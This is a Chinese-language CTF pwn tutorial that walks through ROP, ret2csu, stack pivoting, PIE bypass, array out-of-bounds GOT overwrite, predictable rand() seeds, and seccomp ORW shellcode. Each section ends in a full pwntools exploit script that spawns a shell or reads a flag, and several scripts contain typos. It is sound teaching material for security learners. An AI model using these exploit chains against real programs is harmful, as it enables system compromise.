CTF-pwn 技术总结（1）
===============

**初级Rop**
---------

返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允许攻击者在程序启用了安全保护技术（如堆栈不可执行—NX保护）的情况下控制程序执行流，执行恶意代码。

### 使用方法：

利用栈溢出控制程序中函数的返回地址，再借助 ROPgadget 寻找程序/libc 中带有ret的指令，利用这些指令构造一个指令序列，从而控制程序的执行。

### 例题演示：

来自某学校新生赛题： checkin，

ida打开发现需要输入三个变量满足一个简单的等式，没什么限制随意构造即可

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91db606fbc1d598e47423062acbc6c646e9b29e8.png)

进入vul函数，发现存在栈溢出，偏移为10h，等下就要在这里构造ROP链

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ab2dc9fad2c689a896634db8297f5459163c488e.png)

还找到了后门函数，

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0c415edbc6399cacbaa34878d323b575163e8484.png)

利用ROPgadget工具寻找可用的指令：

![image-20211229111212035](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d44ecbd32cbc69add901034a68ab4c2b7bd670f3.png)

也可以用它查找字符串：

![image-20211229111352335](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7c650f09b649cb5287e194a69abcf1e2f9a198a.png)

#### 思路：

这样构造下面这样的ROP链就可以getshell了

```assembly
pop rdi; ret; binsh_addr; system_addr
```

#### Exp：

```python
from pwn import *
context.log_level = 'debug'
p = process( " . /checkin")
e = ELF( ".checkin")
puts_got = e.got["puts"]
pop_rdi = 0x400953
a = str(32)
b = str(0)
c = str(0)
sys_addr = 0x4007c6b
binsh_addr = 0x601060
off = 0x10 + 8
p.sendlineafter( "Give ne your a:", a)
p.sendlineafter( "Give me your b:", b)
p.sendlineafter( "cive me your c:", c)
#gdb.attach(p, "bp 0x4007FC")
payload = "a"* off + p64(pop_rdi)+ p64(binsh_addr) +p64(sys_addr)
payload = payload.ljust( 100 , "a")
p.send(payload)
p.interactive()
```

**通用ROP**
---------

**通用ROP** 也被称为 **ret2csu** ，因为利用的是64位ELF程序中带有的 **cus\_init 函数**，让程序返回到这个函数上，我们就能控制很多寄存器的值，

csu\_init函数代码：

```assembly
void _libc_csu_init(void)
public __libc_csu_init
__libc_csu_init proc near               ; DATA XREF: _start+16o
push    r15
push    r14
mov     r15d, edi
push    r13
push    r12
lea     r12, __frame_dummy_init_array_entry
push    rbp
lea     rbp, __do_global_dtors_aux_fini_array_entry
push    rbx
mov     r14, rsi
mov     r13, rdx
sub     rbp, r12
sub     rsp, 8
sar     rbp, 3
call    _init_proc
test    rbp, rbp
jz      short loc_400616
xor     ebx, ebx
nop     dword ptr [rax+rax+00000000h]

loc_400600:                             ; CODE XREF: __libc_csu_init+54j
mov     rdx, r13 <------------- 第二次返回地址
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8]
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_400600

loc_400616:                             ; CODE XREF: __libc_csu_init+34j
add     rsp, 8
pop     rbx   <-------------- 从这里开始
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
__libc_csu_init endp
```

我们可以发现：

如果我们返回到 **loc\_400616:** 中的 **pop rbx** 处，我们就能控制**rbx、rbp、r12、r13、r14、r15**这6个寄存器的值，然后再让程序返回到 **loc\_400600:** 处，这样 **rdx 、rsi以及edi** 就能通过之前赋值的 **r13、r14、r15** 被我们控制，最后程序还能调用 \**r12+rbx*  8 地址指向的函数 **，但是注意到之后有个** 验证rbx和rbp **的代码，所以实际上rbx和rbp的值已经确定了，我们将其设置成 rbx=0 ，rbp=1，这样我们不仅可以通过验证，不会跳转到** short loc\_400600 **处，而是接下去直到** loc\_400616: **处的** retn**，而且还能直接调用** r12处的函数\*\*（因为rbx=0）。

### 例题演示：

来自 攻防世界-pwn\_100

#### 准备工作

**用die看看程序的基本信息**

![image-20211006203739980](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9871624e7c1abf4c877021804ebaa94f161998c.png)

ELF64位的程序

**用checksec看看开了啥保护**

![image-20211006205700434](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0753cd97a2f63ac370993ac16d679725c9e14496.png)

只开了NX保护

#### 静态分析

![image-20211006203937578](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a605cd37a17c46e6bbba91800807fdc8f4ac23ba.png)

进入函数sub\_40068E，注意到V1只开辟了64h的空间

![image-20211006204028693](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80e4e0bfd5596a041e9432520ba7b7266fa904e9.png)

进入函数 sub\_40063D，分析可知，该函数的功能类似read（0，input，200），就是输入200个byte的数据保存到栈中，存在明显的栈溢出漏洞

![image-20211006204106713](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25311e4fae1a4ada995d5f893fe09959b236495a.png)

#### 开始ROP

发现程序中没有现成的system和“/bin/sh”使用，所以我们考虑使用通用ROP解题

找到两个通用ROP的关键地址

```assembly
cus_addr_end = 0x40075a
cus_addr_front = 0x400740
```

![image-20211006211043925](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0e74e02ee540e8a05ae76af1fffd5465bdf3af8b.png)

控制程序返回到这两个地址，我们可以控制rbx,rbp,r12,r13,r14,r15,rdx,rsi,edi 寄存器的数据,即64位程序函数的传参都没问题了，并且还可以调用我们构造的\[r12+rbx\*8\]地址处所指向的的函数。

### 思路：

#### 1.利用puts函数泄露libc中函数的地址

具体实现：

利用栈溢出覆盖栈中原本的返回地址为*cus\_addr\_end*，将我们需要的寄存器参数（*puts\_got\_addr*）写入，再将返回地址覆盖为*cus\_addr\_front*，这样就可以执行puts函数泄露puts函数的地址，注意执行完*cus\_addr\_front*后还会接下去执行*cus\_addr\_end*处的pop，所以需要填充8  *7 = 56 byte的数据，最后再将返回地址覆盖为*main\_addr\*，因为我们之后还得再利用栈溢出漏洞，还得注意将payload填充至200 byte（输入函数有要求）

**注意这里输入数据用的是send()而不是sendline，因为输入函数是read()而不是gets()**

接下来接收打印在屏幕上的puts地址，再与libc中puts偏移地址相减获得libc基址——*libc\_base*，之后就可以轻松获取execve函数的地址。

#### 2.利用read函数将字符串写入bss段

具体实现：

类似第一步的操作，将r12寄存器的值设置为read函数got表地址——*read\_got\_addr*、将其参数设置为bss段偏移为16的地址——*bss\_base\_16*，执行read()

你可能会好奇为什么不直接用bss段的起始地址而是用bss段偏移为16的地址？

**注意这里有一个坑，调试了好几遍才发现**

![image-20211006214322596](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-144442b4e5cc4b735bc92944b82ff9d63d350ea5.png)

**main函数的开始从*cs:stdin*和*cs:stdout*里取值赋给寄存器，作为setbuf函数的参数，并且bss段首存在stdin，stdout 结构体指针，如果在bss段首写入数据将这两个结构体指针覆盖了，程序运行到call\_setbuf函数会报错，然后终止，所以要避开这两个结构体指针，从*bss\_base\_16*写入execve地址——*sys\_addr***

最后利用send()将“/bin/sh"写入*bss\_base\_16* + 8处。

#### 3.再次利用通用ROP执行execve

具体实现：

类似第一步的操作，将r12寄存器的值设置为*bss\_base\_16*、将其参数设置*bss\_base\_16* + 8,执行execv("/bin/sh")。

#### Exp：

```python
from pwn import *
#context.log_level = 'debug'
p = process("./pwn_100")
e = ELF("./pwn_100")

main_addr = 0x4006b8
cus_addr_end = 0x40075a
cus_addr_front = 0x400740
puts_plt_addr = e.plt["puts"]
puts_got_addr = e.got["puts"]
read_got_addr = e.got["read"]
bss_base_16 = e.bss() + 16

print("bss+16:" + hex(bss_base_16))
off = 0x40 + 8

##get puts_got_addr
payload1 = off * 'a' + p64(cus_addr_end) + p64(0) + p64(1) + p64(puts_got_addr) + p64(0) + p64(0) + p64(puts_got_addr) + p64(cus_addr_front) + 56 * 'a' + p64(main_addr)
payload1 = payload1.ljust(200, "B")
#gdb.attach(p,"b *0x4006AC")

p.send(payload1)
p.recvuntil("bye~\n")
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,"\x00"))
print("puts_addr:" + hex(puts_addr))

#get sys_addr
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = puts_addr - libc.symbols["puts"]
sys_addr = libc_base + libc.symbols["execve"]
print("sys_addr:" + hex(sys_addr))

##read(0,bss,16)
payload2 = off * 'a' + p64(cus_addr_end) + p64(0) + p64(1) + p64(read_got_addr)  + p64(16) + p64(bss_base_16) + p64(0) + p64(cus_addr_front) + 56 * 'a' + p64(main_addr)
payload2 = payload2.ljust(200, "B")

p.send(payload2) 

##sent(/bin/sh) to bss
p.recvuntil('bye~\n')
p.send(p64(sys_addr) + '/bin/sh\x00')

##getshell
payload3 = off * 'a' + p64(cus_addr_end) + p64(0) + p64(1) + p64(bss_base_16)  + p64(0) + p64(0) + p64(bss_base_16 + 8) + p64(cus_addr_front) + 56 * 'a' + p64(main_addr)
payload3 = payload3.ljust(200, "B")

p.send(payload3)
p.interactive()
```

栈迁移
---

当溢出字节不够构造ROP链时，让栈迁移到攻击者能写入的一个地址, 只要这个地址下的内容攻击者提前布局好，就一样能进行ROP。

我们需要了解栈迁移用到的最关键的两个汇编指令 **leave** 指令和 **ret** 指令。其作用就是用来还原栈空间的。

```assembly
leave = mov esp, rbp; pop rbp
ret = pop rip
```

### **例题演示：**

来自 ctfshow摆烂杯-CET6

这道题题目给了libc，

![image-20211229124550246](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2ecdf2bde319cdc570d442028642ad41550a3ec0.png)

只开了NX的64位程序，

![image-20211229124614502](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6fa788826d761ea69f546ae36464ee03d272b08a.png)

第一关利用4字节的栈溢出覆盖seconds为0，

这里明显存在16字节的栈溢出，但是实在太短了，根本没办法做什么事，果断使用栈迁移，

![image-20211229140348428](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1643231c7fd05298932f2468101c63e28131fce.png)

#### 思路：

将 **rbp** 覆盖成 **fake\_stack地址(0x404F00)**，让程序再回到 **read函数(0x4011ae)**, 然后再巧妙把 **rbp** 覆盖成 **fake\_stack+0x40处地址(0x404F40)**——这样就能在 **fake\_stack地址(0x404F00)** 处写入数据，并让程序再回到read函数，这一次 **rsp** 因为 **leave；retn**，变为 **fake\_stack+0x10(0x404f10)** ,这样就能通过构造ROP链，控制read函数的返回地址，让其打印出got表里puts函数的地址，从而就获取到了libc基址，再次让程序返回read函数，最后构造getshell的ROP链即可。

#### Exp：

```python
from pwn import *
context.log_level = 'debug'

p = process('./CET6')
elf = ELF("./CET6")
libc = elf.libc

pop_rdi = 0x4012f3
fake_stack = 0x404F00
read_addr = 0x4011ae
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

p.sendafter('your name:\n','\x00' * 0x8)
payload = 'a' * 0x40 + p64(fake_stack) + p64(read_addr)
p.sendafter('QAQ:How was your test???', payload)
payload = 'a' * 0x40 + p64(fake_stack + 40) + p64(read_addr)    # 为了能在fake_stack处写入数据
p.send(payload)
payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_addr)   # 此时的rsp = 0X404f08
p.send(payload)
put_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))

libc_base = put_addr - libc.symols['puts']
success('libc_base:'+ hex(libc_base))
binsh = libc_base + libc.search('/bin/sh\x00').next()
system = libc_base + libc.symols['system']

payload = 'a'*0x20 + p64(pop_rdi) + p64(binsh) + p64(system)  # 此时的rsp = 0X404f20
p.send(payload)

p.interactive()
```

**PIE绕过**
---------

### PIE（ ASLR ）保护机制

PIE和ASLR的是操作系统的功能选项，两者一般一起配合使用，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行 **Return-to-libc** 攻击。

但是PIE影响的是程序加载的基址，并不会影响指令间的相对地址，因此如果我们能够泄露程序的某个地址，就可以通过修改偏移获得程序其它函数的地址。

### PIE怎么绕过

虽然程序每次运行的基址会变,但程序中的各段的相对偏移是不会变的,只要泄露出来一个地址,比如函数栈帧中的返回地址

,通过ida静态的看他的程序地址,就能算出基址,从而实现绕过

### 例题演示：

来自某高校新生赛题—checkin\_revenge

输入三个数字满足等式，还是没啥限制，随意构造即可

![image-20211123175154905](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2864ffaded44061e01f4064b41385b5986cdb7c0.png)

这里存在明显的栈溢出

![image-20211123180155091](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8c292519f4fb9f9ca01cc66d18dcacb5310eea76.png)

但是这一题是开了PIE和RELRO的64位程序，所以我们不能再覆盖got表，

![image-20211123175429770](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f4313f125a08458b5f4113aab68a157aa9edd873.png)

虽然PIE烦人，但是还是有弱点的：

**PIE 保护的一个弱点就是pie不会随机化地址的低12位，通俗点说就是我们十六进制地址的后三位，这样我们才有“文章”可做**

现在先整理一下思路：

- 我们的目的是得到libc中system和/bin.sh的地址
- 开启了地址随机化，每次运行的基址都不一样，所以得先得到每次程序运行的libc的基址，这里我们利用**libc\_start\_main**，我们想办法得到程序中libc\_start\_main的地址，减去libc中的偏移，得到libc基址，进而获得system等的地址
- 为了得到libc基址，我们已经让程序正常运行了一次，那我们接下来就是要让程序再出现一次栈溢出漏洞,在这时截获它，让它运行system(’/bin/sh’), getshell

所以程序的运行地址我们要先泄露出来，有了它我们就能利用 **plt表** 泄露出 **got表** 内容。

具体做法是利用 **put()** 函数是打印一个字符串，直到遇到 '**\\x00**'才会停止打印，而我们输入的函数是 **read()** ，它不会帮我们添加 '**\\x00**',所以我们能用这个点来泄露出 **vlu()** 的返回地址，即main函数里的地址，也就能得到程序的运行基址，注意到 **vul()** 的返回地址为 **A89** ，而我们只能覆盖一个字节，开了PIE后只有最后三位是相同的，所以不能覆盖两个字节，所以我们只能回到 **A7F**处，同样能达到我们再次栈溢出的目的

![image-20211123182311710](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1476212b795f17d6e61ef464cb08908554f7865.png)

然后有了程序基址，我们正常利用puts的**plt表**来调用puts泄露**got表**内容，因为got表写的是libc函数地址，所以就等于我们得到了libc基址，然后就是64位正常做。

#### EXP：

```python
from pwn import *
context.log_level = 'debug'

#p = process("./checkin_revenge")
p = remote("172.16.68.4", 10002)
e = ELF("./checkin_revenge")

a = str(1)
b = str(2)
c = str(3)

off = 0x10 + 8 
p.sendlineafter("Give me your a:",a)
p.sendlineafter("Give me your b:",b)
p.sendlineafter("Give me your c:",c)

#gdb.attach(p, "bp $rebase(0x991)")
payload = "a" * off + "\x7f"
p.send(payload)
main_addr = u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00'))
success("main:" + hex(main_addr))
code_base = main_addr & 0xfffffffffffff000

puts_plt = e.plt["puts"] + code_base
print("puts_plt:" + hex(puts_plt))
puts_got = e.got["puts"] + code_base
pop_rdi = 0x0000000000000b03 +  code_base
payload = 'a' * off  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) 
p.send(payload)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,"\x00"))
print("puts_addr:" + hex(puts_addr))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./x86_libc.so.6")
base_addr = puts_addr - libc.symbols["puts"]
system_addr = base_addr + libc.symbols["system"]
binsh_addr = base_addr + libc.search("/bin/sh").next()
success("system:" + hex(system_addr))
success("binsh:" + hex(binsh_addr))

payload = 'a' * off + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
```

数组越界
----

所谓的数组越界，简单地讲就是指数组下标变量的取值超过了初始定义时的大小，导致对数组元素的访问出现在数组的范围之外，这类错误也是 C 语言程序中最常见的错误之一。

在 C 语言中，数组必须是静态的。换而言之，数组的大小必须在程序运行前就确定下来。由于 C 语言并不具有类似 Java 等语言中现有的静态分析工具的功能，可以对程序中数组下标取值范围进行严格检查，一旦发现数组上溢或下溢，都会因抛出异常而终止程序。也就是说，C 语言并不检验数组边界，数组的两端都有可能越界，从而使其他变量的数据甚至程序代码被破坏。

### 利用数组越界漏洞我们能干什么？

答案是：修改任意地址里的数据

比如我们可以用数组越界漏洞，将got表里printf函数的地址修改成 system（‘/bin/sh’”）的地址，那么程序在之后调用printf函数时，实际上调用的是函数 system（‘/bin/sh’”），这样我们就获得了目标主机的控制权限。

### RELRO保护

在Linux中有两种RELRO模式：`Partial RELRO` 和 `Full RELRO`。Linux中`Partical RELRO`默认开启。如果开启 `FUll RELRO`，意味着我们无法修改got表，这样也就没法通过修改GOT表来进行 **Return-to-libc** 攻击

### 例题演示：

来自某学校新生杯赛题-arry

首先，利用工具查看保护，发现没有 `FUll RELRO`，意味着我们可以修改GOT表，而且开了PIE保护，说明我们很可能泄露一些地址出来，

![image-20211223124956035](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d37ef2fb60459080786034b11c0dcb55dcb17c5b.png)

![image-20211223152708565](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5a3ecb5860549997d951f542809169f883b02fc9.png)

用ida打开，发现程序可以通过数组越界查看任意地址里的值并更改它，并且程序已经存在system（“/bin/sh”）了。

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e3d2bf964824403043abb4049653cb8601cca23a.png)

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-96097aa4970be9590ea8a56d49d423e48a1ffd7b.png)

因为程序开了 **aslr保护**（最后三位不变），所以我们要先泄露程序代码段的基址，然后再将 printf 的got表覆盖成后门函数的地址，

![image-20211223154352265](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-73fb393412bab9e1ac969493bacecaf0a37c0c95.png)

在ida里可以发现数组arry的地址在bss段里，并且离got表很近，故我们可以通过计算got表项地址与arry的地址之间的偏移来获取got表项里的内容。

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25ad9e2dbf4f400054f9d3a8680a12d6a8c71384.png)

在gdb中调试也可以发现 bss段中arry离got段很近，直接将arry与got项之间地址相减得到两者之间的**偏移**，利用这个 **偏移** 获得 **stack\_chk\_fail** 函数的地址，然后用0xFFFFFFFFF000 与得到的地址相与得到 **代码段基址** ，然后用 **代码段基址** 加上 **arry和system的got表地址的偏移** 计算得到后门函数地址，再利用一次数组越界将 **printf的got表项** 覆盖成后门函数地址

**坑点：** 第一次利用数组越界来获得代码段基址，我是选择泄露system函数的got表值，不知道为什么change时我填入的是获取到的它的原始值，但是调试的时候发现程序中的system got表值被更改了，应该是这里有什么保护机制吧，所以之后选择泄露 **stack\_chk\_fail** got表项来获得代码段基址。

#### **Exp** ：

```python
from pwn import *
context.log_level = 'debug'

p = process("./arry")
#p = remote("172.16.68.4",10000)
printf_offset = -128 
stack_chk_fail_offset = -152

#gdb.attach(p,"b* $rebase(0xadf)")

p.sendlineafter("index:",str(stack_chk_fail_offset))
p.recvuntil("content:")
stack_chk_fail = u64(p.recv(6).ljust(8,"\x00"))
print(hex(stack_chk_fail))
p.sendlineafter("change:",p64(stack_chk_fail))
base = stack_chk_fail & 0xfffffffff000

p.sendlineafter("index:",str(printf_offset))
p.sendlineafter("change:",p64(0xA93 + base))
p.interactive()
```

伪随机数
----

在C语言中,rand()函数可以用来产生随机数，但是这不是真真意义上的随机数，是一个伪随机数，是根据一个数，我们可以称它为种子，为基准以某个递推公式推算出来的一系数，当这系列数很大的时候，就符合正态公布，从而相当于产生了随机数，但这不是真正的随机数，当计算机正常开机后，这个种子的值是定了的，除非你破坏了系统，为了改变这个种子的值，C提供了srand()函数，它的原形是void srand( int a)。

### 例题演示：

某高校新生赛题—guess

64位保护全开

![image-20211123193651612](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-06933e4387ce17f26a581b26ab62070db97a8180.png)

主函数是输入一个文件名，然后程序会打开并读取它的前4个字节，将每个字节作为随机数种子，生成随机数。

![image-20211123193808671](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d027eb78e005bae764e0653d006b6e713646833e.png)

题目的难点在我们不知道靶机上有啥文件，但是这同样也存在一个漏洞。

#### 非预期解：

随意输入一个文件名，因为不存在这个文件，所以打开文件失败，随机数种子是初始值 0，这样每次生成的随机数都是同样的，是一个固定值，利用 **在相同libc库下由相同的随机数种子生成的随机数相同** 这个点，我们可以很轻松''猜''出四次 '随机数'。

EXP：

```python
from pwn import *
from ctypes import *

context.log_level = "debug"

p = remote("172.16.68.4", 10006)
#p = process("./guess")
#elf = cdll.LoadLibrary('./x64_libc.so.6')
elf = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

payload = '0.txt'
p.sendafter('First of all, choose a file you like it.\n',payload)

elf.srand(0)
for i in range(4):
payload = str(elf.rand())
p.sendlineafter("number:",payload)

p.interactive()
```

#### 正常解：

目前我们可以确定在目标靶机上的文件就是这个 **guess程序本身** ，而guess程序是一个 **ELF文件** ，它的前四个字节是一个固定值：**0x7F454C46** ，接下来利用 **在相同libc库下由相同的随机数种子生成的随机数相同** 这个点模拟播种，生成随机数就好了。

![image-20211123195011368](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-549a406d46e2448758018c46ec74968f6681c310.png)

EXP：

```python
from pwn import *
from ctypes import *

context.log_level = "debug"

p = remote("172.16.68.4", 10006)
#p = process("./guess")
#elf = cdll.LoadLibrary('./x64_libc.so.6')
elf = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

payload = 'guess'
p.sendafter('First of all, choose a file you like it.\n',payload)

key = "7F454C46"
for i in range(0,8,2):
    elf.srand(int(key[i:i+2],16))
    payload = str(elf.rand())
    p.sendlineafter("number:",payload)

p.interactive()
```

sandbox
-------

 sandbox（沙箱），是一种安全机制，为执行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。  
在ctf比赛中，pwn题中的沙盒一般都会限制 execve 的系统调用，这样一来one\_gadget和system调用都不好使，只能采取 **open/read/write** 的组合方式来读取flag，即 **ORW类题**。

### 例题演示：

来自某高校新生杯赛题—shellcode

ida打开发现这道题是让我们输入一段shellcode，然后程序会运行它，但是这里存在**sandbox()**函数，他会进行过滤，这道题的提示里面说**execve()**被ban了，让我们尝试直接读取flag

![image-20211115180126969](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-02c71516163d762bfc77db1b0ec93af00effb5b0.png)

很明显这是一类题型——**ORW**类题

**ORW** 类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 execve 等），使得我们并不能正常 get shell ，只能通过 ROP 的方式先调用 open 打开 flag 文件，然后利用 read 把 flag 的值读取到内存里面， 最后通过 write 来读取并打印 flag 内容。

所以我们需要一个依次调用**open()**、**read()**、**write()**的shellcode，先用**open()**打开文件flag.txt 然后通过**read()**读取文件内容到 栈上 最后利用**write()**将其输出到屏幕上。

#### Exp：

```python
from pwn import *

p = process("./shellcode")
context(os="linux", arch="amd64",log_level = 'debug') 

gdb.attach(p,"b *0x400CE7")
shellcode = shellcraft.open('flag.txt')
print("this is asm:"+shellcode)
print("this is bitcode:" + asm(shellcode))
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
shellcode = asm(shellcode)
p.sendline(shellcode)
p.interactive()

```

**关键点：** 利用pwntools自带的功能生成我们想要的shellcode，先选择架构

```python
context(os = "linux", arch = "amd64")
```

然后再生成shellcode,

```python
shellcraft.fuction(arg1,arg2,arg3...)
```

这个命令能帮我们生成一个调用函数fuction(arg1,arg2,arg3...)的汇编代码，

```python
asm(shellcode)
```

最后再用**asm()**包裹 shellcode的汇编代码，生成字节码，一个shellcode就完成啦！

### 例题演示2：

来自ctfshow摆烂杯—CET4

![image-20211230000520954](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a1830afdd9532da9287147ad1e4a172e1f4e98e0.png)

只开了NX保护，

![image-20211229223027477](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b85b590f3e8c71c3b9e45a0b5ec6f0462869259.png)

这道题已知libc版本，

#### 方法一：

因为已知libc，所以可以先泄露got表函数地址，然后return\_to\_libc，利用libc函数构造ROP链，执行 **ORW** 获取flag。

##### 思路：

先向bss段写入flag字符串，然后利用open函数（参数是flag字符串、0、0）打开flag，然后再利用read函数（参数是文件指针=0x3，bss段地址，100）读取open函数打开的flag文件中的数据，这里有一个隐藏知识，**open函数打开的第一个文件的fd指针一般都为0x3**，最后用write函数（参数是1，bss段地址，100）将read读取到的数据显示到屏幕上。

##### Exp:

```python
from pwn import *
context.log_level = 'debug'

#p = process('./CET4')
p = remote('pwn.challenge.ctf.show',28188)
e = ELF('./CET4')

def sla(signal, content):
  p.sendlineafter(signal, content)

def rn(signal):
  p.recvuntil(signal)

def r_a64(signal):
  return u64(p.recvuntil(signal)[-6:].ljust(8,'\x00'))

rn(':')
p.send('\x00'*8)
puts_plt = e.plt['puts']
puts_got = e.got['puts']
pop_rdi = 0x4013d3
payload = 'a' * 0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x401290)
sla('\n', payload)
puts_add = r_a64('\x7f')
print(hex(puts_add))

libc = ELF("./libc6_2.30-0ubuntu2_amd64.so")
libc_base = puts_add - libc.symbols['puts']
read = libc_base + libc.symbols['read']
write = libc_base + libc.symbols['write']
open  = libc_base + libc.symbols['open']
success('libc_base:' + hex(libc_base))

rn(':')
p.send('\x00'*8)
pop_rdi = 0x4013d3
bss = 0x404260

pop_rdx_r12 = libc_base + 0x11c421
pop_rsi = libc_base + 0x2709c 
payload = 'a' * 0x48 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_r12) + p64(4) + p64(0) +  p64(read) + p64(0x401290)

payload = payload.ljust(0x100,'a')
rn('\n')
p.send(payload)
p.send('flag')
success('set string success!')

rn(':')
p.send('\x00'*8)
payload = 'a' * 0x48 + p64(pop_rdi) +  p64(bss) + p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0) + p64(0) + p64(open) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_r12) + p64(100) + p64(0) + p64(read) +  p64(0x401290)
print(len(payload))
payload = payload.ljust(0x100,'a')
rn('\n')
p.send(payload)
success('read file success!')

rn(':')
p.send('\x00'*8)
payload = 'a' * 0x48  + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_r12) + p64(100) + p64(0) +  p64(write) + p64(0x401290)
payload = payload.ljust(0x100,'a')
rn('\n')
p.send(payload)
success('wirte file success!')

p.interactive()
```

#### 方法二：

编写shellcode执行来 **ORW** 获取flag，但是没有可写入并且可执行的程序段，这里要用到一个函数—mprotect

![image-20211230015117252](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5ed61313f866781bdd7f6739fcbeddbdc1929c6.png)

##### mprotect：

在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。

函数原型如下：

```c
#include <unistd.h>   
#include <sys/mmap.h>   
int mprotect(const void *start, size_t len, int prot);
```

mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

1）PROT\_READ：表示内存段内的内容可读；

2）PROT\_WRITE：表示内存段内的内容可写；

3）PROT\_EXEC：表示内存段中的内容可执行；

4）PROT\_NONE：表示内存段中的内容根本没法访问。

##### 思路：

通过mprotect函数修改bss段为可执行，然后先bss段中写入shellcode，最后让程序返回到shellcode地址。

##### Exp：

```python
from pwn import *

p=process('./CET4')
elf=ELF("./CET4")

libc=elf.libc
context.log_level='debug'
context.arch='amd64'

rdi=0x00000000004013d3
bss=0x404000
main=elf.sym['main']

p.sendafter('your name:\n','a'*4+p32(0))
p.sendafter('QAQ:How was your test???','a'*0x48+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main))

libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))-libc.sym['puts']
success('libc_base:'+hex(libc_base))

rsi=0x0000000000027529+libc_base
rdx_r12=0x000000000011c371+libc_base

p.sendafter('your name:\n','a'*4+p32(0))

protect=libc_base+libc.sym['mprotect']

payload=p64(rdi)+p64(0x404000)+p64(rsi)+p64(0x1000)+p64(rdx_r12)+p64(7)+p64(0)+p64(protect)+p64(main)

p.sendafter('QAQ:How was your test???','a'*0x48+payload)

p.sendafter('your name:\n','a'*4+p32(0))

read=libc_base+libc.sym['read']

payload=p64(rdi)+p64(0)+p64(rsi)+p64(0x404500)+p64(rdx_r12)+p64(0x100)+p64(0)+p64(read)+p64(0x404500)

p.sendafter('QAQ:How was your test???','a'*0x48+payload)

code = shellcraft.open("./flag")
code += shellcraft.read(3, 0x404900, 0x50)
code += shellcraft.write(1, 0x404900, 0x50)
shellcode = asm(code)
pause()
p.sendline(shellcode)

p.interactive()
```